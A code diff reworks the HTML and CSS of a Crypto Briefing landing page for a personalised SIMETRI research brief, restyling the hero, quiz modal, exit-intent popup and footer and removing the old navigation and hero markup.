-            font-family: var(--mono);
-            font-size: 9px;
-            font-weight: 700;
-            color: var(--text-faint);
-            text-transform: uppercase;
-            letter-spacing: 0.08em;
-            margin-bottom: 10px;
-        }
-
-        .rs-row {
-            display: flex;
-            justify-content: space-between;
-            padding: 5px 0;
-            border-bottom: 1px solid var(--border);
-        }
-
-        .rs-row:last-child {
-            border-bottom: none;
-        }
-
-        .rs-k {
-            font-size: 12px;
-            color: var(--text-muted);
-        }
-
-        .rs-v {
-            font-family: var(--mono);
-            font-size: 12px;
-            font-weight: 600;
-            color: var(--text);
-        }
-
-        .btn-confirm {
-            background: var(--blue);
-            color: #fff;
-            border: none;
-            padding: 13px 28px;
-            border-radius: var(--r);
-            font-size: 14px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: background .15s;
-            margin-bottom: 10px;
-        }
-
-        .btn-confirm:hover {
-            background: var(--blue-mid);
-        }
-
-        .success-note {
-            font-family: var(--mono);
-            font-size: 10px;
-            color: var(--text-faint);
-        }
-
-        /* ── RESPONSIVE ──────────────────────────────── */
-        @media (max-width: 860px) {
-            .hero-inner {
-                grid-template-columns: 1fr;
-                gap: 40px;
-                padding: 0;
-            }
-
-            .hero {
-                padding: 52px 20px 48px;
-            }
-
-            .hero h1 {
-                font-size: 32px;
-            }
-
-            .simetri-card {
-                display: none;
-            }
-
-            .feat-row {
-                grid-template-columns: 48px 1fr;
-            }
-
-            .feat-row .feat-viz {
-                display: none;
-            }
-
-            .sample-grid {
-                grid-template-columns: 1fr;
-            }
-
-            .trust-sep {
-                display: none;
-            }
-
-            .nav {
-                padding: 0 16px;
-            }
-
-            .nav-links {
-                display: none;
-            }
-
-            .sect {
-                padding: 56px 20px;
-            }
-
-            .qc-body {
-                padding: 24px 20px;
-            }
-
-            .qc-footer {
-                padding: 0 20px 24px;
-            }
-
-            .footer-inner {
-                flex-direction: column;
-            }
-        }
-
-        @media (prefers-reduced-motion: reduce) {
-
-            *,
-            *::before,
-            *::after {
-                animation-duration: 0.01ms !important;
-                transition-duration: 0.01ms !important;
-            }
-        }
-    </style>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Crypto Briefing — Your SIMETRI Intelligence Report</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Lora:ital,wght@0,600;0,700;1,600;1,700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet"/>
+<style>
+/* ── TOKENS ───────────────────────────────────── */
+:root {
+  --bg:           #FFFFFF;
+  --bg-soft:      #F7F9FC;
+  --bg-wash:      #F0F4FF;
+  --bg-dark:      #0B0E14;
+  --bg-dark-2:    #12161F;
+  --bg-dark-3:    #1A2030;
+  --surface:      #FFFFFF;
+  --border:       #E2E8F2;
+  --border-dark:  #1F2733;
+  --text:         #0D1321;
+  --text-mid:     #3A4660;
+  --text-muted:   #6B7A99;
+  --text-faint:   #9BAAC4;
+  --blue:         #1E3A8A;
+  --blue-mid:     #2563EB;
+  --blue-light:   #3B82F6;
+  --blue-wash:    #EFF4FF;
+  --gold:         #C8A951;
+  --gold-light:   #F5E9BF;
+  --green:        #16A34A;
+  --green-wash:   #DCFCE7;
+  --red:          #DC2626;
+  --red-wash:     #FEE2E2;
+  --amber:        #D97706;
+  --mono:         'JetBrains Mono', monospace;
+  --serif:        'Lora', Georgia, serif;
+  --sans:         'Inter', system-ui, sans-serif;
+  --r:            5px;
+  --r-lg:         10px;
+  --r-xl:         16px;
+  --shadow-sm:    0 1px 4px rgba(10,20,60,0.07);
+  --shadow-md:    0 4px 20px rgba(10,20,60,0.10);
+  --shadow-lg:    0 20px 64px rgba(10,20,60,0.16);
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body {
+  font-family: var(--sans);
+  background: var(--bg);
+  color: var(--text);
+  font-size: 15px;
+  line-height: 1.65;
+  -webkit-font-smoothing: antialiased;
+}
+a { color: var(--blue-mid); text-decoration: none; }
+button { font-family: var(--sans); }
+img { display: block; }
+
+/* ── NAV ───────────────────────────────────────── */
+.nav {
+  position: sticky; top: 0; z-index: 800;
+  background: rgba(255,255,255,0.96);
+  backdrop-filter: blur(12px);
+  border-bottom: 1px solid var(--border);
+  height: 58px;
+  display: flex; align-items: center;
+  padding: 0 28px;
+}
+.nav-inner {
+  max-width: 1160px; width: 100%; margin: 0 auto;
+  display: flex; align-items: center; justify-content: space-between; gap: 20px;
+}
+.nav-logo {
+  display: flex; align-items: center; gap: 10px;
+  font-family: var(--sans); font-weight: 700; font-size: 15px; color: var(--text);
+  white-space: nowrap;
+  text-decoration: none;
+}
+.nav-links {
+  display: flex; align-items: center; gap: 24px; list-style: none;
+}
+.nav-links a {
+  font-size: 13px; font-weight: 500; color: var(--text-muted);
+  transition: color .15s;
+}
+.nav-links a:hover { color: var(--text); }
+.nav-right { display: flex; align-items: center; gap: 10px; }
+.nav-login {
+  font-size: 13px; font-weight: 500; color: var(--blue);
+  padding: 7px 14px; border-radius: var(--r);
+  border: 1px solid rgba(30,58,138,0.2);
+  background: none; cursor: pointer;
+  transition: all .15s;
+}
+.nav-login:hover { background: var(--blue-wash); border-color: var(--blue); }
+.nav-cta {
+  font-size: 13px; font-weight: 700; color: #fff;
+  padding: 8px 18px; border-radius: var(--r);
+  background: var(--blue); border: none; cursor: pointer;
+  transition: background .15s, transform .1s;
+}
+.nav-cta:hover { background: var(--blue-mid); transform: translateY(-1px); }
+
+/* ── HERO ──────────────────────────────────────── */
+.hero {
+  background: var(--bg-dark);
+  border-bottom: 1px solid var(--border-dark);
+  padding: 72px 28px 68px;
+}
+.hero-inner {
+  max-width: 1160px; margin: 0 auto;
+  display: grid; grid-template-columns: 1.1fr 1fr; gap: 72px; align-items: center;
+}
+.hero-tag {
+  display: inline-flex; align-items: center; gap: 7px;
+  font-family: var(--mono); font-size: 10px; font-weight: 700;
+  color: var(--gold); letter-spacing: 0.1em; text-transform: uppercase;
+  margin-bottom: 22px;
+}
+.hero-tag-dot {
+  width: 6px; height: 6px; border-radius: 50%;
+  background: var(--gold);
+  animation: glow 2.2s ease-in-out infinite;
+}
+@keyframes glow {
+  0%,100% { box-shadow: 0 0 0 0 rgba(200,169,81,0.5); }
+  50%      { box-shadow: 0 0 0 6px rgba(200,169,81,0); }
+}
+.hero h1 {
+  font-family: var(--serif);
+  font-size: 44px; font-weight: 700; line-height: 1.1;
+  color: #fff; letter-spacing: -0.01em;
+  margin-bottom: 20px;
+}
+.hero h1 em {
+  font-style: italic; color: var(--gold);
+}
+.hero-sub {
+  font-size: 15px; color: rgba(255,255,255,0.55);
+  line-height: 1.75; max-width: 460px; margin-bottom: 34px;
+}
+.hero-actions { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+.btn-gold {
+  background: var(--gold); color: #0B0E14;
+  padding: 13px 26px; border-radius: var(--r);
+  font-size: 14px; font-weight: 700; border: none; cursor: pointer;
+  transition: background .15s, transform .1s, box-shadow .15s;
+  box-shadow: 0 4px 16px rgba(200,169,81,0.32);
+}
+.btn-gold:hover { background: #d9b85a; transform: translateY(-2px); box-shadow: 0 6px 22px rgba(200,169,81,0.44); }
+.btn-ghost {
+  background: rgba(255,255,255,0.06); color: rgba(255,255,255,0.65);
+  padding: 13px 22px; border-radius: var(--r);
+  font-size: 14px; font-weight: 600;
+  border: 1px solid rgba(255,255,255,0.12); cursor: pointer;
+  transition: all .15s;
+}
+.btn-ghost:hover { background: rgba(255,255,255,0.1); color: #fff; }
+.hero-note {
+  margin-top: 16px;
+  font-family: var(--mono); font-size: 10px;
+  color: rgba(255,255,255,0.22); letter-spacing: 0.04em;
+}
+
+/* SIMETRI Card — hero right */
+.simetri-card {
+  background: var(--bg-dark-2);
+  border: 1px solid var(--border-dark);
+  border-radius: var(--r-xl);
+  overflow: hidden;
+  box-shadow: 0 32px 80px rgba(0,0,0,0.4);
+  animation: riseIn .5s cubic-bezier(0.22,1,0.36,1) both;
+}
+@keyframes riseIn { from{opacity:0;transform:translateY(20px)} to{opacity:1;transform:translateY(0)} }
+.sc-header {
+  padding: 16px 22px;
+  border-bottom: 1px solid var(--border-dark);
+  display: flex; align-items: center; justify-content: space-between;
+}
+.sc-header-left { display: flex; flex-direction: column; gap: 2px; }
+.sc-label {
+  font-family: var(--mono); font-size: 9px; font-weight: 700;
+  color: rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 0.1em;
+}
+.sc-project { font-size: 14px; font-weight: 700; color: #fff; }
+.sc-grade-wrap { display: flex; flex-direction: column; align-items: center; gap: 2px; }
+.sc-grade {
+  font-family: var(--mono); font-size: 28px; font-weight: 700;
+  color: var(--gold); line-height: 1;
+}
+.sc-grade-label {
+  font-family: var(--mono); font-size: 8px; font-weight: 600;
+  color: rgba(200,169,81,0.55); text-transform: uppercase; letter-spacing: 0.08em;
+}
+.sc-body { padding: 20px 22px; }
+.sc-score-row {
+  display: flex; justify-content: space-between; align-items: center;
+  padding: 9px 0; border-bottom: 1px solid rgba(255,255,255,0.05);
+}
+.sc-score-row:last-of-type { border-bottom: none; }
+.sc-score-name { font-size: 12px; color: rgba(255,255,255,0.45); }
+.sc-score-bar-wrap { flex: 1; margin: 0 14px; height: 4px; background: rgba(255,255,255,0.07); border-radius: 2px; }
+.sc-score-bar { height: 100%; border-radius: 2px; transition: width .4s ease; }
+.sc-score-val { font-family: var(--mono); font-size: 12px; font-weight: 700; color: rgba(255,255,255,0.75); }
+.sc-footer {
+  padding: 12px 22px; border-top: 1px solid var(--border-dark);
+  background: rgba(255,255,255,0.02);
+  display: flex; align-items: center; justify-content: space-between;
+}
+.sc-footer-note {
+  font-family: var(--mono); font-size: 9px; color: rgba(255,255,255,0.2);
+  line-height: 1.5;
+}
+.sc-personalized-tag {
+  display: inline-flex; align-items: center; gap: 5px;
+  font-family: var(--mono); font-size: 9px; font-weight: 700;
+  color: var(--gold); letter-spacing: 0.06em; text-transform: uppercase;
+  background: rgba(200,169,81,0.1); border: 1px solid rgba(200,169,81,0.2);
+  padding: 4px 10px; border-radius: 40px;
+}
+
+/* ── TRUST STRIP ─────────────────────────────── */
+.trust-strip {
+  background: var(--bg-soft);
+  border-bottom: 1px solid var(--border);
+  padding: 20px 28px;
+}
+.trust-inner {
+  max-width: 1160px; margin: 0 auto;
+  display: flex; align-items: center; justify-content: space-between;
+  gap: 20px; flex-wrap: wrap;
+}
+.trust-item { display: flex; align-items: center; gap: 10px; }
+.trust-icon { flex-shrink: 0; }
+.trust-val {
+  font-size: 14px; font-weight: 700; color: var(--text);
+}
+.trust-desc { font-size: 12px; color: var(--text-muted); }
+.trust-sep {
+  width: 1px; height: 28px; background: var(--border); flex-shrink: 0;
+}
+
+/* ── SECTIONS ────────────────────────────────── */
+.sect { padding: 80px 28px; }
+.sect-alt { background: var(--bg-soft); border-top: 1px solid var(--border); border-bottom: 1px solid var(--border); }
+.sect-inner { max-width: 1160px; margin: 0 auto; }
+
+.sect-eyebrow {
+  font-family: var(--mono); font-size: 10px; font-weight: 700;
+  color: var(--blue); text-transform: uppercase; letter-spacing: 0.12em;
+  margin-bottom: 12px;
+}
+.sect-title {
+  font-family: var(--serif); font-size: 32px; font-weight: 700;
+  color: var(--text); line-height: 1.22; letter-spacing: -0.01em;
+  margin-bottom: 14px;
+}
+.sect-sub {
+  font-size: 15px; color: var(--text-muted); max-width: 540px;
+  line-height: 1.75; margin-bottom: 52px;
+}
+
+/* Editorial feature rows */
+.feat-list { display: flex; flex-direction: column; gap: 0; }
+.feat-row {
+  display: grid; grid-template-columns: 80px 1fr 200px;
+  gap: 32px; align-items: start;
+  padding: 36px 0; border-bottom: 1px solid var(--border);
+}
+.feat-row:first-child { border-top: 1px solid var(--border); }
+.feat-index {
+  font-family: var(--mono); font-size: 11px; font-weight: 700;
+  color: var(--text-faint); padding-top: 4px; letter-spacing: 0.06em;
+}
+.feat-content h3 {
+  font-family: var(--serif); font-size: 18px; font-weight: 700;
+  color: var(--text); margin-bottom: 8px; line-height: 1.3;
+}
+.feat-content p { font-size: 13px; color: var(--text-muted); line-height: 1.7; }
+.feat-tag {
+  display: inline-block; margin-top: 12px;
+  padding: 3px 10px; border-radius: 40px;
+  font-family: var(--mono); font-size: 9px; font-weight: 700;
+  text-transform: uppercase; letter-spacing: 0.08em;
+}
+.feat-tag-blue { background: var(--blue-wash); color: var(--blue); }
+.feat-tag-gold { background: var(--gold-light); color: #7A6010; }
+.feat-tag-green { background: var(--green-wash); color: #14532D; }
+.feat-viz { display: flex; align-items: center; justify-content: center; }
+
+/* Sample output section */
+.sample-grid {
+  display: grid; grid-template-columns: 1fr 1.4fr; gap: 36px; align-items: start;
+}
+.report-card {
+  background: var(--bg-dark); border: 1px solid var(--border-dark);
+  border-radius: var(--r-xl); overflow: hidden;
+}
+.rc-top {
+  padding: 20px 24px; border-bottom: 1px solid var(--border-dark);
+}
+.rc-top-eyebrow {
+  font-family: var(--mono); font-size: 9px; font-weight: 700;
+  color: rgba(255,255,255,0.3); text-transform: uppercase; letter-spacing: 0.1em;
+  margin-bottom: 6px;
+}
+.rc-top-title { font-size: 15px; font-weight: 700; color: #fff; margin-bottom: 10px; }
+.rc-top-meta { display: flex; align-items: center; gap: 10px; flex-wrap: wrap; }
+.rc-badge {
+  font-family: var(--mono); font-size: 9px; font-weight: 700;
+  padding: 3px 9px; border-radius: 40px; text-transform: uppercase; letter-spacing: 0.06em;
+}
+.rc-badge-gold { background: rgba(200,169,81,0.15); color: var(--gold); border: 1px solid rgba(200,169,81,0.25); }
+.rc-badge-blue { background: rgba(37,99,235,0.15); color: #60A5FA; border: 1px solid rgba(37,99,235,0.25); }
+.rc-body { padding: 20px 24px; }
+.rc-row {
+  display: flex; justify-content: space-between; align-items: baseline;
+  padding: 7px 0; border-bottom: 1px solid rgba(255,255,255,0.05);
+}
+.rc-row:last-child { border-bottom: none; }
+.rc-k { font-size: 11px; color: rgba(255,255,255,0.35); }
+.rc-v { font-family: var(--mono); font-size: 11px; font-weight: 600; }
+.rc-v-white { color: rgba(255,255,255,0.8); }
+.rc-v-gold  { color: var(--gold); }
+.rc-v-blue  { color: #60A5FA; }
+.rc-v-green { color: #4ADE80; }
+.rc-v-red   { color: #F87171; }
+
+.analysis-panels { display: flex; flex-direction: column; gap: 16px; }
+.ap {
+  background: var(--surface); border: 1px solid var(--border);
+  border-radius: var(--r-lg); overflow: hidden;
+}
+.ap-head {
+  padding: 11px 18px; background: var(--bg-soft);
+  border-bottom: 1px solid var(--border);
+  display: flex; align-items: center; gap: 8px;
+}
+.ap-dot { width: 7px; height: 7px; border-radius: 50%; }
+.ap-title {
+  font-family: var(--mono); font-size: 10px; font-weight: 700;
+  color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.08em;
+}
+.ap-body { padding: 14px 18px; }
+.ap-finding {
+  display: flex; align-items: flex-start; gap: 10px;
+  padding: 7px 0; border-bottom: 1px solid var(--border);
+}
+.ap-finding:last-child { border-bottom: none; }
+.ap-finding-icon { font-size: 11px; margin-top: 3px; flex-shrink: 0; }
+.ap-finding-text { font-size: 12px; color: var(--text-mid); line-height: 1.55; }
+.ap-finding-mono { font-family: var(--mono); font-size: 10px; color: var(--text-faint); margin-top: 2px; }
+
+/* ── FINAL CTA ───────────────────────────────── */
+.final-cta-sect {
+  background: var(--bg-dark);
+  padding: 80px 28px;
+  text-align: center;
+  border-top: 1px solid var(--border-dark);
+}
+.final-cta-inner { max-width: 580px; margin: 0 auto; }
+.final-cta-inner .fc-eyebrow {
+  font-family: var(--mono); font-size: 10px; font-weight: 700;
+  color: var(--gold); text-transform: uppercase; letter-spacing: 0.12em;
+  margin-bottom: 16px;
+}
+.final-cta-inner h2 {
+  font-family: var(--serif); font-size: 34px; font-weight: 700;
+  color: #fff; line-height: 1.2; margin-bottom: 16px;
+}
+.final-cta-inner p {
+  font-size: 14px; color: rgba(255,255,255,0.5); line-height: 1.75; margin-bottom: 30px;
+}
+.final-cta-note { font-family: var(--mono); font-size: 10px; color: rgba(255,255,255,0.2); margin-top: 14px; }
+
+/* ── FOOTER ──────────────────────────────────── */
+footer {
+  background: var(--bg-dark-2);
+  border-top: 1px solid var(--border-dark);
+  padding: 44px 28px 32px;
+}
+.footer-inner {
+  max-width: 1160px; margin: 0 auto;
+  display: flex; align-items: flex-start; justify-content: space-between;
+  gap: 32px; flex-wrap: wrap;
+}
+.footer-brand { display: flex; align-items: center; gap: 9px; margin-bottom: 12px; }
+.footer-brand-name { font-weight: 700; font-size: 14px; color: #fff; }
+.footer-legal {
+  font-size: 11px; color: rgba(255,255,255,0.25);
+  max-width: 480px; line-height: 1.7;
+}
+.footer-links { display: flex; flex-wrap: wrap; gap: 16px; }
+.footer-links a {
+  font-size: 12px; color: rgba(255,255,255,0.3);
+  transition: color .15s;
+}
+.footer-links a:hover { color: rgba(255,255,255,0.65); }
+.footer-bottom {
+  max-width: 1160px; margin: 28px auto 0;
+  padding-top: 20px; border-top: 1px solid var(--border-dark);
+  font-family: var(--mono); font-size: 10px; color: rgba(255,255,255,0.18);
+  display: flex; align-items: center; justify-content: space-between; gap: 16px; flex-wrap: wrap;
+}
+
+/* ═════════════════════════════════════════════
+   EXIT-INTENT POPUP
+═════════════════════════════════════════════ */
+.overlay {
+  display: none; position: fixed; inset: 0;
+  background: rgba(6,10,20,0.76);
+  z-index: 1000; align-items: center; justify-content: center;
+  padding: 20px; backdrop-filter: blur(5px);
+  animation: fadeIn .2s ease;
+}
+.overlay.active { display: flex; }
+@keyframes fadeIn { from{opacity:0} to{opacity:1} }
+
+.exit-card {
+  background: var(--bg-dark-2);
+  border: 1px solid var(--border-dark);
+  border-radius: var(--r-xl);
+  max-width: 480px; width: 100%;
+  overflow: hidden;
+  animation: popUp .28s cubic-bezier(0.34,1.18,0.64,1);
+  box-shadow: var(--shadow-lg);
+}
+@keyframes popUp { from{opacity:0;transform:translateY(22px)} to{opacity:1;transform:translateY(0)} }
+.exit-stripe { height: 3px; background: linear-gradient(90deg, var(--blue) 0%, var(--gold) 100%); }
+.exit-body { padding: 32px 34px 36px; }
+.exit-icon { margin-bottom: 16px; }
+.exit-card h2 {
+  font-family: var(--serif); font-size: 22px; font-weight: 700;
+  color: #fff; line-height: 1.28; margin-bottom: 12px;
+}
+.exit-card p { font-size: 13px; color: rgba(255,255,255,0.48); line-height: 1.7; margin-bottom: 24px; }
+.exit-cta {
+  width: 100%; padding: 13px; background: var(--gold); color: #0B0E14;
+  border: none; border-radius: var(--r); font-size: 14px; font-weight: 700;
+  cursor: pointer; transition: background .15s; margin-bottom: 10px;
+}
+.exit-cta:hover { background: #d9b85a; }
+.exit-dismiss {
+  display: block; width: 100%; text-align: center;
+  font-size: 12px; color: rgba(255,255,255,0.22);
+  background: none; border: none; cursor: pointer; transition: color .15s;
+}
+.exit-dismiss:hover { color: rgba(255,255,255,0.45); }
+
+/* ═════════════════════════════════════════════
+   QUIZ MODAL
+═════════════════════════════════════════════ */
+.quiz-card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: var(--r-xl);
+  max-width: 600px; width: 100%;
+  max-height: 92vh; overflow-y: auto;
+  animation: popUp .3s cubic-bezier(0.34,1.18,0.64,1);
+  box-shadow: var(--shadow-lg);
+}
+.qc-header {
+  position: sticky; top: 0; z-index: 10;
+  background: var(--bg-dark);
+  padding: 18px 24px;
+  display: flex; align-items: center; justify-content: space-between;
+}
+.qc-hd-left { display: flex; align-items: center; gap: 10px; }
+.qc-title {
+  font-family: var(--mono); font-size: 11px; font-weight: 700;
+  color: rgba(255,255,255,0.6); text-transform: uppercase; letter-spacing: 0.08em;
+}
+.qc-counter { font-family: var(--mono); font-size: 10px; color: rgba(255,255,255,0.28); }
+.qc-close {
+  width: 26px; height: 26px; border-radius: 50%;
+  background: rgba(255,255,255,0.07); border: none;
+  color: rgba(255,255,255,0.45); font-size: 15px;
+  cursor: pointer; display: flex; align-items: center; justify-content: center;
+  transition: background .15s;
+}
+.qc-close:hover { background: rgba(255,255,255,0.14); }
+.qc-progress { height: 3px; background: rgba(255,255,255,0.06); }
+.qc-bar { height: 100%; background: linear-gradient(90deg, var(--blue) 0%, var(--gold) 100%); transition: width .35s ease; }
+
+.qc-body { padding: 32px 28px; }
+.quiz-step { display: none; }
+.quiz-step.active { display: block; }
+
+.qs-section {
+  font-family: var(--mono); font-size: 10px; font-weight: 700;
+  color: var(--blue); text-transform: uppercase; letter-spacing: 0.12em;
+  margin-bottom: 10px;
+}
+.qs-q {
+  font-family: var(--serif); font-size: 20px; font-weight: 700;
+  color: var(--text); line-height: 1.28; margin-bottom: 8px;
+}
+.qs-sub { font-size: 13px; color: var(--text-muted); line-height: 1.65; margin-bottom: 26px; }
+
+.opt-list { display: flex; flex-direction: column; gap: 9px; }
+.opt {
+  display: flex; align-items: center; gap: 14px;
+  padding: 13px 16px; border: 1.5px solid var(--border);
+  border-radius: var(--r); cursor: pointer;
+  transition: border-color .15s, background .15s;
+}
+.opt:hover { border-color: var(--blue-light); background: var(--blue-wash); }
+.opt.sel  { border-color: var(--blue); background: var(--blue-wash); }
+.opt-radio {
+  width: 17px; height: 17px; border-radius: 50%;
+  border: 2px solid var(--border); flex-shrink: 0; transition: all .15s;
+  display: flex; align-items: center; justify-content: center;
+}
+.opt.sel .opt-radio { border-color: var(--blue); background: var(--blue); }
+.opt.sel .opt-radio::after { content:''; width:5px; height:5px; border-radius:50%; background:#fff; }
+.opt-text { font-size: 14px; font-weight: 500; color: var(--text); line-height: 1.4; }
+.opt-text span { display:block; font-size:12px; font-weight:400; color:var(--text-muted); margin-top:2px; }
+
+/* Tags (multi-select) */
+.tag-grid { display: flex; flex-wrap: wrap; gap: 9px; }
+.tag-opt {
+  display: flex; align-items: center; gap: 7px;
+  padding: 8px 15px; border: 1.5px solid var(--border);
+  border-radius: 40px; cursor: pointer;
+  font-size: 13px; font-weight: 500; color: var(--text);
+  transition: all .15s; user-select: none;
+}
+.tag-opt:hover { border-color: var(--blue-light); color: var(--blue); }
+.tag-opt.sel  { border-color: var(--blue); background: var(--blue-wash); color: var(--blue); }
+.tag-ck {
+  width: 13px; height: 13px; border-radius: 3px;
+  border: 2px solid var(--border); flex-shrink: 0; transition: all .15s;
+}
+.tag-opt.sel .tag-ck {
+  background: var(--blue); border-color: var(--blue);
+  background-image: url("data:image/svg+xml,%3Csvg width='9' height='7' viewBox='0 0 9 7' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='M1 3.5L3 5.5L8 1' stroke='white' stroke-width='1.5' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
+  background-repeat: no-repeat; background-position: center;
+}
+
+/* Email */
+.email-block {
+  margin-top: 22px; padding-top: 22px;
+  border-top: 1px solid var(--border);
+}
+.email-block label {
+  display: block; font-size: 13px; font-weight: 600;
+  color: var(--text); margin-bottom: 8px;
+}
+.email-block input {
+  width: 100%; padding: 11px 15px;
+  border: 1.5px solid var(--border); border-radius: var(--r);
+  font-size: 14px; font-family: var(--sans); color: var(--text);
+  outline: none; transition: border-color .15s;
+}
+.email-block input:focus { border-color: var(--blue); }
+.email-block input.err { border-color: var(--red); }
+.email-err { font-size: 12px; color: var(--red); margin-top: 5px; display: none; }
+
+/* QC footer */
+.qc-footer {
+  padding: 0 28px 28px;
+  display: flex; align-items: center; justify-content: space-between;
+}
+.qc-back {
+  background: none; border: 1px solid var(--border);
+  border-radius: var(--r); padding: 10px 18px;
+  font-size: 13px; font-weight: 500; color: var(--text-muted);
+  cursor: pointer; transition: all .15s;
+}
+.qc-back:hover { border-color: var(--text-muted); color: var(--text); }
+.qc-back:disabled { opacity: 0; pointer-events: none; }
+.qc-next {
+  background: var(--blue); border: none;
+  border-radius: var(--r); padding: 11px 26px;
+  font-size: 14px; font-weight: 700; color: #fff;
+  cursor: pointer; transition: background .15s, opacity .15s;
+}
+.qc-next:disabled { opacity: 0.32; cursor: not-allowed; }
+.qc-next:not(:disabled):hover { background: var(--blue-mid); }
+
+/* Loader */
+.loader-pane { padding: 40px 20px; text-align: center; }
+.spin-ring {
+  width: 52px; height: 52px; border-radius: 50%;
+  border: 3px solid var(--border);
+  border-top-color: var(--blue);
+  animation: spin 0.85s linear infinite;
+  margin: 0 auto 22px;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.loader-title { font-family: var(--serif); font-size: 18px; font-weight: 700; color: var(--text); margin-bottom: 8px; }
+.loader-sub { font-size: 13px; color: var(--text-muted); max-width: 340px; margin: 0 auto 28px; line-height: 1.65; }
+.chk-list { display: flex; flex-direction: column; gap: 10px; max-width: 320px; margin: 0 auto; text-align: left; }
+.chk-item {
+  display: flex; align-items: center; gap: 12px;
+  font-size: 13px; color: var(--text-muted); transition: color .3s;
+}
+.chk-item.done { color: var(--text); }
+.chk-icon {
+  width: 20px; height: 20px; border-radius: 50%;
+  border: 2px solid var(--border); flex-shrink: 0;
+  display: flex; align-items: center; justify-content: center;
+  font-size: 10px; transition: all .3s;
+}
+.chk-item.done .chk-icon { background: var(--green); border-color: var(--green); color: #fff; }
+
+/* Success */
+.success-pane { padding: 40px 20px 24px; text-align: center; }
+.success-ring {
+  width: 68px; height: 68px; border-radius: 50%;
+  background: var(--green-wash); margin: 0 auto 18px;
+  display: flex; align-items: center; justify-content: center;
+  animation: pop .4s cubic-bezier(0.34,1.4,0.64,1);
+}
+@keyframes pop { from{transform:scale(0.5);opacity:0} to{transform:scale(1);opacity:1} }
+.success-pane h2 { font-family: var(--serif); font-size: 22px; font-weight: 700; color: var(--text); margin-bottom: 10px; }
+.success-pane p { font-size: 13px; color: var(--text-muted); max-width: 400px; margin: 0 auto 24px; line-height: 1.7; }
+.report-summary {
+  background: var(--bg-soft); border: 1px solid var(--border);
+  border-radius: var(--r); padding: 16px 20px;
+  max-width: 420px; margin: 0 auto 22px; text-align: left;
+}
+.rs-title {
+  font-family: var(--mono); font-size: 9px; font-weight: 700;
+  color: var(--text-faint); text-transform: uppercase; letter-spacing: 0.08em;
+  margin-bottom: 10px;
+}
+.rs-row {
+  display: flex; justify-content: space-between;
+  padding: 5px 0; border-bottom: 1px solid var(--border);
+}
+.rs-row:last-child { border-bottom: none; }
+.rs-k { font-size: 12px; color: var(--text-muted); }
+.rs-v { font-family: var(--mono); font-size: 12px; font-weight: 600; color: var(--text); }
+.btn-confirm {
+  background: var(--blue); color: #fff; border: none;
+  padding: 13px 28px; border-radius: var(--r);
+  font-size: 14px; font-weight: 700; cursor: pointer;
+  transition: background .15s; margin-bottom: 10px;
+}
+.btn-confirm:hover { background: var(--blue-mid); }
+.success-note { font-family: var(--mono); font-size: 10px; color: var(--text-faint); }
+
+/* ── RESPONSIVE ──────────────────────────────── */
+@media (max-width: 860px) {
+  .hero-inner { grid-template-columns: 1fr; gap: 40px; padding: 0; }
+  .hero { padding: 52px 20px 48px; }
+  .hero h1 { font-size: 32px; }
+  .simetri-card { display: none; }
+  .feat-row { grid-template-columns: 48px 1fr; }
+  .feat-row .feat-viz { display: none; }
+  .sample-grid { grid-template-columns: 1fr; }
+  .trust-sep { display: none; }
+  .nav { padding: 0 16px; }
+  .nav-links { display: none; }
+  .sect { padding: 56px 20px; }
+  .qc-body { padding: 24px 20px; }
+  .qc-footer { padding: 0 20px 24px; }
+  .footer-inner { flex-direction: column; }
+}
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after { animation-duration: 0.01ms !important; transition-duration: 0.01ms !important; }
+}
+</style>
 </head>
+<body>
 
-<body><!-- ▓▓▓ NAV ▓▓▓ -->
-    <nav class="nav">
-        <div class="nav-inner"> <a href="#" class="nav-logo"> <!-- Crypto Briefing logotype SVG --> <svg width="26"
-                    height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-                    <rect width="26" height="26" rx="5" fill="#1E3A8A" />
-                    <rect x="5" y="5" width="7" height="7" rx="1.5" fill="white" />
-                    <rect x="14" y="5" width="7" height="4" rx="1" fill="white" opacity="0.6" />
-                    <rect x="14" y="11" width="7" height="4" rx="1" fill="white" opacity="0.4" />
-                    <rect x="5" y="14" width="16" height="2.5" rx="1" fill="white" opacity="0.25" />
-                    <rect x="5" y="18.5" width="11" height="2.5" rx="1" fill="white" opacity="0.18" />
-                </svg> <span>Crypto Briefing</span> </a>
-            <ul class="nav-links">
-                <li><a href="#">News</a></li>
-                <li><a href="#">SIMETRI Ratings</a></li>
-                <li><a href="#">Research</a></li>
-                <li><a href="#">Price Analysis</a></li>
-                <li><a href="#">Learn</a></li>
-            </ul>
-            <div class="nav-right"> <button class="nav-login">Log In</button> <button class="nav-cta"
-                    onclick="openQuiz()">Get Your Report</button> </div>
-        </div>
-    </nav><!-- ▓▓▓ HERO ▓▓▓ -->
-    <section class="hero">
-        <div class="hero-inner">
-            <div>
-                <div class="hero-tag"><span class="hero-tag-dot"></span> SIMETRI · Personalized Research Brief</div>
-                <h1>Independent Analysis,<br />Calibrated to Your<br /><em>Actual</em> Risk Profile.</h1>
-                <p class="hero-sub">Crypto Briefing's SIMETRI engine evaluates projects using 25 quantitative and
-                    qualitative criteria — ad-free, without affiliate bias. Your personalized brief surfaces only the
-                    ratings and risk signals that match your stated mandate and holdings focus.</p>
-                <div class="hero-actions"> <button class="btn-gold" onclick="openQuiz()">Build My SIMETRI Brief
-                        →</button> <button class="btn-ghost" onclick="void(0)">View Sample Report ↗</button> </div>
-                <div class="hero-note">No advertising. No affiliate arrangements. Independent since 2017.</div>
-            </div> <!-- SIMETRI rating card mockup -->
